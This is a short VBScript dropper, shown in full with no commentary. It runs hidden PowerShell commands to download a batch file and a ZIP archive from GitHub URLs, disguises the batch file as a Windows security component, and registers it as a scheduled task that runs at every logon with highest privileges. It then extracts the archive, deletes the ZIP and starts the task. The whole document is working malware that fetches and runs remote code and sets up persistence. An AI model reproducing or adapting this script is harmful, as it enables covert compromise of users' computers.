Option Explicit

Dim shell, fso, url1, url2, zipPath, zipExtractPath, batPath, simPath
Dim downloadCommand1, downloadCommand2, unzipCommand, runTaskCommand, schtasksCommand

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

batPath = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\WindowSecuryti.bat"
zipPath = shell.ExpandEnvironmentStrings("%PUBLIC%") & "\Document.zip"
zipExtractPath = shell.ExpandEnvironmentStrings("%PUBLIC%") & "\Document"
simPath = zipExtractPath & "\Lib\sim.py"

url1 = "https://github.com/abareklw/ud/raw/main/ud.bat"
downloadCommand1 = "powershell -WindowStyle Hidden -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('" & url1 & "', '" & batPath & "')"""
shell.Run downloadCommand1, 0, True

schtasksCommand = "schtasks /create /tn ""WindowsSecurityTask"" /tr """ & batPath & """ /sc onlogon /rl highest /f"
shell.Run "cmd /c " & schtasksCommand, 0, True


url2 = "https://github.com/abareklw/dcm/raw/main/Document.zip"
downloadCommand2 = "powershell -WindowStyle Hidden -Command ""(New-Object Net.WebClient).DownloadFile('" & url2 & "', '" & zipPath & "')"""
shell.Run downloadCommand2, 0, True


unzipCommand = "powershell -WindowStyle Hidden -Command ""Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::ExtractToDirectory('" & zipPath & "', '" & zipExtractPath & "')"""
shell.Run unzipCommand, 0, True


If fso.FileExists(zipPath) Then fso.DeleteFile(zipPath)


runTaskCommand = "schtasks /run /tn ""WindowsSecurityTask"""
shell.Run "cmd /c " & runTaskCommand, 0, False
